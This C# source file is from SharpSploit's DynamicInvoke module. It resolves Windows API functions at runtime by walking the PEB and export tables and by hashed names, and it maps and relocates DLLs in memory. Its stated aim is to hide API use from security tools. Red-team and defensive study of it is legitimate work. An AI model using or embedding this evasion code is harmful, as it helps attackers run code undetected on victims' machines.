// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

using Execute = SharpSploit.Execution;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using System.Linq;

namespace SharpSploit.Execution.DynamicInvoke
{
    /// <summary>
    /// Generic is class for dynamically invoking arbitrary API calls from memory or disk. DynamicInvoke avoids suspicious
    /// P/Invoke signatures, imports, and IAT entries by loading modules and invoking their functions at runtime.
    /// </summary>
    public class Generic
    {
        /// <summary>
        /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="DLLName">Name of the DLL.</param>
        /// <param name="FunctionName">Name of the function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        /// <summary>
        /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        /// <summary>
        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            Execute.Native.UNICODE_STRING uModuleName = new Execute.Native.UNICODE_STRING();
            Native.RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            Execute.Native.NTSTATUS CallResult = Native.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != Execute.Native.NTSTATUS.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return hModule;
        }

        /// <summary>
        /// Maps a DLL from disk into a Section.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">Full path fo the DLL on disk.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static PE.PE_MANUAL_MAP MapModuleFromDisk(string DLLPath)
        {
            // Check file exists
            if (!File.Exists(DLLPath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            // Open file handle
            Execute.Native.UNICODE_STRING ObjectName = new Execute.Native.UNICODE_STRING();
            Native.RtlInitUnicodeString(ref ObjectName, (@"\??\" + DLLPath));
            IntPtr pObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(ObjectName));
            Marshal.StructureToPtr(ObjectName, pObjectName, true);

            Execution.Native.OBJECT_ATTRIBUTES oa = new Execute.Native.OBJECT_ATTRIBUTES();
            oa.Length = Marshal.SizeOf(oa);
            oa.ObjectName = pObjectName;
            oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

            Execution.Native.IO_STATUS_BLOCK iob = new Execute.Native.IO_STATUS_BLOCK();

            IntPtr hFile = IntPtr.Zero;
            Native.NtOpenFile(ref hFile, Execute.Win32.Kernel32.FileAccessFlags.FILE_READ_DATA | Execute.Win32.Kernel32.FileAccessFlags.FILE_EXECUTE | Execute.Win32.Kernel32.FileAccessFlags.FILE_READ_ATTRIBUTES | Execute.Win32.Kernel32.FileAccessFlags.SYNCHRONIZE, ref oa, ref iob, Execute.Win32.Kernel32.FileShareFlags.FILE_SHARE_READ | Execute.Win32.Kernel32.FileShareFlags.FILE_SHARE_DELETE, Execute.Win32.Kernel32.FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | Execute.Win32.Kernel32.FileOpenFlags.FILE_NON_DIRECTORY_FILE);

            // Create section from hFile
            IntPtr hSection = IntPtr.Zero;
            ulong MaxSize = 0;
            Execution.Native.NTSTATUS ret = Native.NtCreateSection(ref hSection, (UInt32)Execution.Win32.WinNT.ACCESS_MASK.SECTION_ALL_ACCESS, IntPtr.Zero, ref MaxSize, Execution.Win32.WinNT.PAGE_READONLY, Execution.Win32.WinNT.SEC_IMAGE, hFile);

            // Map view of file
            IntPtr pBaseAddress = IntPtr.Zero;
            Native.NtMapViewOfSection(hSection, (IntPtr)(-1), ref pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref MaxSize, 0x2, 0x0, Execution.Win32.WinNT.PAGE_READWRITE);

            // Prepare return object
            PE.PE_MANUAL_MAP SecMapObject = new PE.PE_MANUAL_MAP();
            SecMapObject.PEINFO = GetPeMetaData(pBaseAddress);
            SecMapObject.ModuleBase = pBaseAddress;

            return SecMapObject;
        }

        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="FunctionName">Name of the exported procedure.</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }

        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="Ordinal">Ordinal of the exported procedure.</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, short Ordinal, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, Ordinal);
        }

        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="FunctionHash">Hash of the exported procedure.</param>
        /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionHash, long Key, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionHash, Key);
        }

        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing. This function uses the Process class in Net.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }

            return IntPtr.Zero;
        }

        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing. This function parses the _PEB_LDR_DATA structure.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
        public static IntPtr GetPebLdrModuleEntry(string DLLName)
        {
            // Get _PEB pointer
            Execute.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));

            // Set function variables
            Boolean Is32Bit = false;
            UInt32 LdrDataOffset = 0;
            UInt32 InLoadOrderModuleListOffset = 0;
            if (IntPtr.Size == 4)
            {
                Is32Bit = true;
                LdrDataOffset = 0xc;
                InLoadOrderModuleListOffset = 0xC;
            } else
            {
                LdrDataOffset = 0x18;
                InLoadOrderModuleListOffset = 0x10;
            }

            // Get module InLoadOrderModuleList -> _LIST_ENTRY
            IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + LdrDataOffset));
            IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64)PEB_LDR_DATA + InLoadOrderModuleListOffset);
            Execution.Native.LIST_ENTRY le = (Execution.Native.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(Execution.Native.LIST_ENTRY));

            // Loop entries
            IntPtr flink = le.Flink;
            IntPtr hModule = IntPtr.Zero;
            while (true)
            {
                Execution.PE.LDR_DATA_TABLE_ENTRY dte = (Execution.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Execution.PE.LDR_DATA_TABLE_ENTRY));
                if (dte.InLoadOrderLinks.Flink == le.Blink)
                {
                    break;
                }

                // Match module name
                if ((Marshal.PtrToStringUni(dte.FullDllName.Buffer)).ToLower().EndsWith(DLLName.ToLower()))
                {
                    hModule = dte.DllBase;
                }
            
                // Move Ptr
                flink = dte.InLoadOrderLinks.Flink;
            }

            return hModule;
        }

        /// <summary>
        /// Generate an HMAC-MD5 hash of the supplied string using an Int64 as the key. This is useful for unique hash based API lookups.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="APIName">API name to hash.</param>
        /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
        /// <returns>string, the computed MD5 hash value.</returns>
        public static string GetAPIHash(string APIName, long Key)
        {
            byte[] data = Encoding.UTF8.GetBytes(APIName.ToLower());
            byte[] kbytes = BitConverter.GetBytes(Key);

            using (HMACMD5 hmac = new HMACMD5(kbytes))
            {
                byte[] bHash = hmac.ComputeHash(data);
                return BitConverter.ToString(bHash).Replace("-", "");
            }
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="Ordinal">The ordinal number to search for (e.g. 0x136 -> ntdll!NtCreateThreadEx).</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, short Ordinal)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    if (FunctionOrdinal == Ordinal)
                    {
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(Ordinal + ", ordinal not found.");
            }
            return FunctionPtr;
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="FunctionHash">Hash of the exported procedure.</param>
        /// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string FunctionHash, long Key)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (GetAPIHash(FunctionName, Key).Equals(FunctionHash, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(FunctionHash + ", export hash not found.");
            }
            return FunctionPtr;
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, string ExportName)
        {
            Execution.Native.ANSI_STRING aFunc = new Execution.Native.ANSI_STRING();
            aFunc.Length = (ushort)ExportName.Length;
            aFunc.MaximumLength = (ushort)(ExportName.Length + 2);
            aFunc.Buffer = Marshal.StringToCoTaskMemAnsi(ExportName);

            IntPtr pAFunc = Marshal.AllocHGlobal(Marshal.SizeOf(aFunc));
            Marshal.StructureToPtr(aFunc, pAFunc, true);

            IntPtr pFuncAddr = IntPtr.Zero;
            Native.LdrGetProcedureAddress(ModuleBase, pAFunc, IntPtr.Zero, ref pFuncAddr);

            Marshal.FreeHGlobal(pAFunc);

            return pFuncAddr;
        }

        /// <summary>
        /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="Ordinal">The ordinal number to search for (e.g. 0x136 -> ntdll!NtCreateThreadEx).</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, short Ordinal)
        {
            IntPtr pFuncAddr = IntPtr.Zero;
            IntPtr pOrd = (IntPtr)Ordinal;

            Native.LdrGetProcedureAddress(ModuleBase, IntPtr.Zero, pOrd, ref pFuncAddr);

            return pFuncAddr;
        }

        /// <summary>
        /// Allocate file to memory, either from disk or from a byte array.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="FilePath">Full path to the module on disk.</param>
        /// <returns>IntPtr base address of the allocated file.</returns>
        public static IntPtr FileToMemoryPointer(string FilePath)
        {
            if (!File.Exists(FilePath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            Byte[] bFile = { };
            try
            {
                bFile = File.ReadAllBytes(FilePath);
            }
            catch
            {
                throw new UnauthorizedAccessException("Access is denied.");
            }

            IntPtr pFile = Marshal.AllocHGlobal(bFile.Length);
            Marshal.Copy(bFile, 0, pFile, bFile.Length);
            return pFile;
        }

        /// <summary>
        /// Allocate file to memory, either from disk or from a byte array.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="FileByteArray">Full byte array of the module.</param>
        /// <returns>IntPtr base address of the allocated file.</returns>
        public static IntPtr FileToMemoryPointer(byte[] FileByteArray)
        {
            IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
            Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
            return pFile;
        }

        /// <summary>
        /// Retrieve PE header information from the module base pointer.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="pModule">Pointer to the module base.</param>
        /// <returns>PE.PE_META_DATA</returns>
        public static PE.PE_META_DATA GetPeMetaData(IntPtr pModule)
        {
            PE.PE_META_DATA PeMetaData = new PE.PE_META_DATA();
            try
            {
                UInt32 e_lfanew = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + 0x3c));
                PeMetaData.Pe = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + e_lfanew));
                // Validate PE signature
                if (PeMetaData.Pe != 0x4550)
                {
                    throw new InvalidOperationException("Invalid PE signature.");
                }
                PeMetaData.ImageFileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((UInt64)pModule + e_lfanew + 0x4), typeof(PE.IMAGE_FILE_HEADER));
                IntPtr OptHeader = (IntPtr)((UInt64)pModule + e_lfanew + 0x18);
                UInt16 PEArch = (UInt16)Marshal.ReadInt16(OptHeader);
                // Validate PE arch
                if (PEArch == 0x010b) // Image is x32
                {
                    PeMetaData.Is32Bit = true;
                    PeMetaData.OptHeader32 = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(OptHeader, typeof(PE.IMAGE_OPTIONAL_HEADER32));
                }
                else if (PEArch == 0x020b) // Image is x64
                {
                    PeMetaData.Is32Bit = false;
                    PeMetaData.OptHeader64 = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(OptHeader, typeof(PE.IMAGE_OPTIONAL_HEADER64));
                } else
                {
                    throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
                }
                // Read sections
                PE.IMAGE_SECTION_HEADER[] SectionArray = new PE.IMAGE_SECTION_HEADER[PeMetaData.ImageFileHeader.NumberOfSections];
                for (int i = 0; i < PeMetaData.ImageFileHeader.NumberOfSections; i++)
                {
                    IntPtr SectionPtr = (IntPtr)((UInt64)OptHeader + PeMetaData.ImageFileHeader.SizeOfOptionalHeader + (UInt32)(i * 0x28));
                    SectionArray[i] = (PE.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(SectionPtr, typeof(PE.IMAGE_SECTION_HEADER));
                }
                PeMetaData.Sections = SectionArray;

            } catch
            {
                throw new InvalidOperationException("Invalid module base specified.");
            }
            return PeMetaData;
        }

        /// <summary>
        /// Relocates a module in memory.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
        /// <returns>Void</returns>
        public static void RelocateModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
            PE.IMAGE_DATA_DIRECTORY idd = new PE.IMAGE_DATA_DIRECTORY();
            Int64 ImageDelta = 0;
            if (PEINFO.Is32Bit)
            {
                idd = PEINFO.OptHeader32.BaseRelocationTable;
                ImageDelta = (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader32.ImageBase);
            }
            else
            {
                idd = PEINFO.OptHeader64.BaseRelocationTable;
                ImageDelta = (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader64.ImageBase);
            }

            // Ptr for the base reloc table
            IntPtr pRelocTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);

            // Loop reloc blocks
            while (true)
            {
                PE.IMAGE_BASE_RELOCATION ibr = new PE.IMAGE_BASE_RELOCATION();
                ibr = (PE.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocTable, typeof(PE.IMAGE_BASE_RELOCATION));

                Int64 RelocCount = ((ibr.SizeOfBlock - Marshal.SizeOf(ibr)) / 2);
                for (int i = 0; i < RelocCount; i++)
                {
                    // Calculate reloc entry ptr
                    IntPtr pRelocEntry = (IntPtr)((UInt64)pRelocTable + (UInt64)Marshal.SizeOf(ibr) + (UInt64)(i * 2));
                    UInt16 RelocValue = (UInt16)Marshal.ReadInt16(pRelocEntry);

                    // Parse reloc value
                    // The type should only ever be 0x0, 0x3, 0xA
                    // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                    UInt16 RelocType = (UInt16)(RelocValue >> 12);
                    UInt16 RelocPatch = (UInt16)(RelocValue & 0xfff);

                    // Perform relocation
                    if (RelocType == 0) // IMAGE_REL_BASED_ABSOLUTE (skip reloc)
                    {
                        continue;
                    }
                    else
                    {
                        try
                        {
                            IntPtr pPatch = (IntPtr)((UInt64)ModuleMemoryBase + ibr.VirtualAdress + RelocPatch);
                            if (RelocType == 0x3) // IMAGE_REL_BASED_HIGHLOW (x86)
                            {
                                Int32 OriginalPtr = Marshal.ReadInt32(pPatch);
                                Marshal.WriteInt32(pPatch, (OriginalPtr + (Int32)ImageDelta));
                            }
                            else // IMAGE_REL_BASED_DIR64 (x64)
                            {
                                Int64 OriginalPtr = Marshal.ReadInt64(pPatch);
                                Marshal.WriteInt64(pPatch, (OriginalPtr + ImageDelta));
                            }
                        } catch
                        {
                            throw new InvalidOperationException("Memory access violation.");
                        }
                    }
                }

                // Check for next block
                pRelocTable = (IntPtr)((UInt64)pRelocTable + ibr.SizeOfBlock);
                if (Marshal.ReadInt32(pRelocTable) == 0)
                {
                    break;
                }
            }
        }

        /// <summary>
        /// Resolve host DLL for API Set DLL.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <returns>Dictionary, a combination of Key:APISetDLL and Val:HostDLL.</returns>
        public static Dictionary<string, string> GetApiSetMapping()
        {
            Execution.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
            UInt32 ApiSetMapOffset = 0;
            if (IntPtr.Size == 4)
            {
                ApiSetMapOffset = 0x38;
            } else
            {
                ApiSetMapOffset = 0x68;
            }

            // Create mapping dictionary
            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();

